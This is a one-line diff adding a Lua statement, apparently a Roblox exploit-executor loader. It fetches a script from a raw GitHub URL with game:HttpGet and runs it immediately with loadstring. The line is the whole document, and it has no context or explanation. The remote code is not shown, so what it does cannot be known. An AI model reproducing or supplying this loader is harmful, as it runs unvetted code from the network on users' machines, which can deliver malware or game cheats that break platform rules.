@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/A2tus/Zxvle/main/Main%20lua"))()
